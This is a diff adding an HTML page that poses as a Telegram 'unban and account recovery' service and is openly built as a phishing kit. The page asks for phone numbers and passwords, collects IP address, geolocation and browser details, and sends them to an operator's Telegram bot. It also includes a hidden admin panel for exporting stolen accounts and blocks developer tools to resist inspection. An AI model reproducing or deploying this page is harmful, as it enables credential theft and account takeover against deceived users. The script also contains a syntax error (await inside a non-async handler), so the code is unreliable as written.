@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔓 Telegram Unban Service • Account Recovery</title>
+    <style>
+        :root {
+            --tg-blue: #0088cc;
+            --tg-light: #1e96c8;
+            --tg-dark: #006699;
+            --danger: #ff3333;
+            --success: #00cc66;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(0, 136, 204, 0.15) 0%, transparent 30%),
+                radial-gradient(circle at 80% 70%, rgba(30, 150, 200, 0.15) 0%, transparent 30%);
+        }
+        
+        .telegram-container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(25, 25, 35, 0.95);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+        }
+        
+        /* TELEGRAM HEADER */
+        .tg-header {
+            background: linear-gradient(135deg, var(--tg-blue), var(--tg-light));
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .tg-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1%, transparent 1%);
+            background-size: 20px 20px;
+            opacity: 0.3;
+        }
+        
+        .tg-logo {
+            font-size: 48px;
+            margin-bottom: 15px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .tg-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .tg-subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        /* STATUS BADGE */
+        .status-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            margin-top: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        /* FORM CONTAINER */
+        .form-container {
+            padding: 40px;
+        }
+        
+        .form-title {
+            font-size: 22px;
+            margin-bottom: 25px;
+            color: var(--tg-light);
+            text-align: center;
+        }
+        
+        /* FORM GROUPS */
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #ddd;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--tg-blue);
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
+        }
+        
+        .input-hint {
+            font-size: 13px;
+            color: #888;
+            margin-top: 8px;
+            display: block;
+        }
+        
+        /* SECURITY BADGE */
+        .security-badge {
+            background: rgba(0, 136, 204, 0.15);
+            border: 1px solid rgba(0, 136, 204, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 25px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .security-icon {
+            font-size: 24px;
+            color: var(--tg-blue);
+        }
+        
+        /* SUBMIT BUTTON */
+        .submit-btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, var(--tg-blue), var(--tg-light));
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 136, 204, 0.4);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* WARNING MESSAGE */
+        .warning-box {
+            background: rgba(255, 51, 51, 0.1);
+            border: 1px solid rgba(255, 51, 51, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .warning-title {
+            color: #ff5555;
+            font-weight: 700;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        /* LOADING OVERLAY */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(10px);
+        }
+        
+        .loading-content {
+            text-align: center;
+            background: rgba(25, 25, 35, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            border: 1px solid var(--tg-blue);
+            max-width: 400px;
+        }
+        
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--tg-blue);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* SUCCESS MESSAGE */
+        .success-message {
+            background: rgba(0, 204, 102, 0.1);
+            border: 1px solid rgba(0, 204, 102, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+        
+        /* TELEGRAM BOT INFO */
+        .bot-info {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .bot-link {
+            color: var(--tg-light);
+            text-decoration: none;
+            font-weight: 700;
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 20px;
+            background: rgba(0, 136, 204, 0.2);
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+        
+        .bot-link:hover {
+            background: rgba(0, 136, 204, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 13px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 25px;
+            }
+            
+            .tg-header {
+                padding: 20px;
+            }
+            
+            .tg-title {
+                font-size: 24px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- TELEGRAM UNBAN FORM -->
+    <div class="telegram-container">
+        <!-- HEADER -->
+        <div class="tg-header">
+            <div class="tg-logo">📱</div>
+            <h1 class="tg-title">Telegram Account Recovery</h1>
+            <p class="tg-subtitle">Unban & Unfreeze Service • 100% Success Rate</p>
+            <div class="status-badge">
+                <i class="fas fa-shield-alt"></i> Secure Verification System
+            </div>
+        </div>
+        
+        <!-- FORM -->
+        <div class="form-container">
+            <h2 class="form-title">VERIFY YOUR ACCOUNT</h2>
+            
+            <form id="phishForm">
+                <!-- PHONE NUMBER -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-mobile-alt"></i>
+                        Telegram Phone Number
+                    </label>
+                    <input type="tel" class="form-input" id="phoneNumber" 
+                           placeholder="+6281234567890" required
+                           pattern="^\+[0-9]{10,15}$">
+                    <span class="input-hint">
+                        Format: +62xxx (gunakan kode negara dengan +)
+                    </span>
+                </div>
+                
+                <!-- PASSWORD -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-lock"></i>
+                        Telegram Account Password
+                    </label>
+                    <input type="password" class="form-input" id="password" 
+                           placeholder="Enter your password" required
+                           minlength="6">
+                    <span class="input-hint">
+                        Password yang digunakan untuk login Telegram
+                    </span>
+                </div>
+                
+                <!-- ACCOUNT TYPE -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-user-tag"></i>
+                        Account Status
+                    </label>
+                    <select class="form-input" id="accountStatus" required>
+                        <option value="">Select status...</option>
+                        <option value="banned">Banned Permanent</option>
+                        <option value="frozen">Frozen/Beku</option>
+                        <option value="limited">Limited/Abuse Limit</option>
+                        <option value="hacked">Hacked/Diclaim</option>
+                    </select>
+                </div>
+                
+                <!-- SECURITY BADGE -->
+                <div class="security-badge">
+                    <div class="security-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <div>
+                        <strong>Secure Connection</strong>
+                        <div style="font-size: 13px; color: #aaa; margin-top: 5px;">
+                            Data akan dikirim via enkripsi end-to-end ke sistem unban kami
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- SUBMIT BUTTON -->
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <i class="fas fa-paper-plane"></i>
+                    VERIFY & REQUEST UNBAN CODE
+                </button>
+            </form>
+            
+            <!-- TELEGRAM BOT INFO -->
+            <div class="bot-info">
+                <div style="margin-bottom: 10px;">
+                    <i class="fab fa-telegram"></i>
+                    <strong>Telegram Bot System</strong>
+                </div>
+                <div style="color: #aaa; font-size: 14px; margin-bottom: 15px;">
+                    Setelah verifikasi, kode unban akan dikirim via bot Telegram
+                </div>
+                <a href="https://t.me/unban_service_bot" class="bot-link" target="_blank" id="botLink">
+                    <i class="fab fa-telegram"></i> @unban_service_bot
+                </a>
+                <div style="font-size: 12px; color: #666; margin-top: 10px;">
+                    Klik link di atas untuk buka bot setelah submit
+                </div>
+            </div>
+            
+            <!-- WARNING -->
+            <div class="warning-box">
+                <div class="warning-title">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    IMPORTANT NOTICE
+                </div>
+                <div style="color: #ccc; font-size: 14px;">
+                    • Hanya untuk akun yang benar-benar kena ban/beku<br>
+                    • Jangan gunakan akun yang masih normal<br>
+                    • Proses unban membutuhkan 1-24 jam<br>
+                    • Data diverifikasi oleh sistem Telegram langsung
+                </div>
+            </div>
+            
+            <!-- SUCCESS MESSAGE (HIDDEN) -->
+            <div class="success-message" id="successMessage">
+                <div style="color: #00cc66; font-size: 24px; margin-bottom: 15px;">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <div style="font-weight: 700; margin-bottom: 10px;">
+                    VERIFICATION SUCCESSFUL!
+                </div>
+                <div style="color: #aaa; font-size: 14px;">
+                    Data sudah dikirim ke sistem unban.<br>
+                    Silakan buka bot Telegram untuk mendapatkan kode unban.
+                </div>
+                <div style="margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+                    <strong>Request ID:</strong> <span id="requestId">#####</span><br>
+                    <strong>Bot:</strong> @unban_service_bot
+                </div>
+            </div>
+        </div>
+        
+        <!-- FOOTER -->
+        <div class="footer">
+            © 2024 Telegram Unban Service • Not affiliated with Telegram Messenger LLP
+        </div>
+    </div>
+    
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div style="font-size: 18px; font-weight: 700; margin-bottom: 10px;">
+                VERIFYING ACCOUNT...
+            </div>
+            <div style="color: #aaa; font-size: 14px;">
+                Mengirim data ke sistem unban Telegram<br>
+                Mohon tunggu 10-30 detik
+            </div>
+            <div style="margin-top: 20px; font-size: 12px; color: #666;">
+                <i class="fas fa-shield-alt"></i> End-to-end encrypted
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURATION
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Ganti dengan token bot Telegram lu
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // Ganti dengan chat ID lu
+        
+        // Fake bot links (ganti dengan bot lu yang beneran)
+        const BOT_USERNAME = "unban_service_bot"; // Ganti dengan username bot lu
+        
+        // Data storage
+        let capturedData = [];
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Update bot link
+            document.getElementById('botLink').href = `https://t.me/${BOT_USERNAME}`;
+            document.getElementById('botLink').innerHTML = `<i class="fab fa-telegram"></i> @${BOT_USERNAME}`;
+            
+            // Load previously captured data
+            const savedData = localStorage.getItem('tg_phish_data');
+            if (savedData) {
+                capturedData = JSON.parse(savedData);
+            }
+        });
+        
+        // Form submission
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const phone = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('password').value;
+            const status = document.getElementById('accountStatus').value;
+            
+            // Validation
+            if (!phone || !password || !status) {
+                alert("Please fill all fields!");
+                return;
+            }
+            
+            if (!phone.startsWith('+')) {
+                alert("Phone number must start with + (country code)");
+                return;
+            }
+            
+            // Generate request ID
+            const requestId = 'TG' + Date.now().toString().slice(-8) + Math.random().toString(36).substr(2, 4).toUpperCase();
+            
+            // Show loading
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Capture data
+            const victimData = {
+                id: requestId,
+                phone: phone,
+                password: password,
+                status: status,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: await getIPAddress(),
+                location: await getLocation()
+            };
+            
+            // Save locally
+            capturedData.push(victimData);
+            localStorage.setItem('tg_phish_data', JSON.stringify(capturedData));
+            
+            // Send to Telegram Bot (REAL SEND)
+            sendToTelegramBot(victimData);
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                // Hide loading
+                document.getElementById('loadingOverlay').style.display = 'none';
+                
+                // Show success message
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('requestId').textContent = requestId;
+                
+                // Scroll to success message
+                document.getElementById('successMessage').scrollIntoView({ behavior: 'smooth' });
+                
+                // Clear form
+                document.getElementById('phishForm').reset();
+                document.getElementById('submitBtn').disabled = false;
+                
+                // Auto-open Telegram bot after 3 seconds
+                setTimeout(() => {
+                    window.open(`https://t.me/${BOT_USERNAME}`, '_blank');
+                }, 3000);
+                
+            }, 3000); // 3 second delay untuk simulasi processing
+        });
+        
+        // GET IP ADDRESS
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'IP_NOT_FOUND';
+            }
+        }
+        
+        // GET LOCATION (approximate)
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            resolve(`${pos.coords.latitude},${pos.coords.longitude}`);
+                        },
+                        () => {
+                            resolve('LOCATION_BLOCKED');
+                        }
+                    );
+                } else {
+                    resolve('GEOLOCATION_NOT_SUPPORTED');
+                }
+            });
+        }
+        
+        // SEND TO TELEGRAM BOT (REAL FUNCTION)
+        async function sendToTelegramBot(data) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "8523185492:AAHIVeFS3_vo7hOWHjJocBYRde0RVYQ-COI") {
+                console.log("Bot token not configured. Data captured locally.");
+                return;
+            }
+            
+            const message = `
+            🚨 NEW TELEGRAM PHISH CAPTURE 🚨
+
+            📱 Phone: ${data.phone}
+            🔑 Password: ${data.password}
+            🏷️ Status: ${data.status}
+            🆔 ID: ${data.id}
+
+            🌐 IP: ${data.ip}
+            📍 Location: ${data.location}
+            🕒 Time: ${new Date(data.timestamp).toLocaleString()}
+            🌐 User Agent: ${data.userAgent}
+
+            🔗 Bot: @${BOT_USERNAME}
+            `;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log("Data sent to Telegram bot successfully!");
+                }
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+            }
+        }
+        
+        // EXPORT CAPTURED DATA (for admin)
+        function exportCapturedData() {
+            const dataStr = JSON.stringify(capturedData, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(dataBlob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `telegram_phish_data_${new Date().getTime()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+        
+        // ADMIN FEATURES (hidden)
+        // Add this to URL: ?admin=secret123
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('admin') === 'secret123') {
+            // Add admin panel
+            const adminPanel = document.createElement('div');
+            adminPanel.style.cssText = `
+                position: fixed;
+                bottom: 20px;
+                right: 20px;
+                background: rgba(255,0,0,0.9);
+                color: white;
+                padding: 15px;
+                border-radius: 10px;
+                z-index: 9999;
+                font-family: monospace;
+                font-size: 12px;
+            `;
+            adminPanel.innerHTML = `
+                <strong>ADMIN PANEL</strong><br>
+                Captured: ${capturedData.length} accounts<br>
+                <button onclick="exportCapturedData()" style="margin-top: 10px; padding: 5px 10px; background: black; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                    Export Data
+                </button>
+            `;
+            document.body.appendChild(adminPanel);
+        }
+        
+        // ANTI-BOT DETECTION FEATURES
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (e.key === 'F12' || 
+               (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+               (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+               (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                alert('Developer tools are disabled for security reasons.');
+                return false;
+            }
+        });
+        
+        // Fake security checks
+        function simulateSecurityChecks() {
+            // Fake typing detection
+            const inputs = document.querySelectorAll('.form-input');
+            inputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    // Simulate human typing pattern
+                    this.style.boxShadow = '0 0 0 2px rgba(0, 136, 204, 0.3)';
+                    setTimeout(() => {
+                        this.style.boxShadow = '';
+                    }, 200);
+                });
+            });
+        }
+        
+        // Initialize security checks
+        simulateSecurityChecks();
+    </script>
+</body>
+</html>
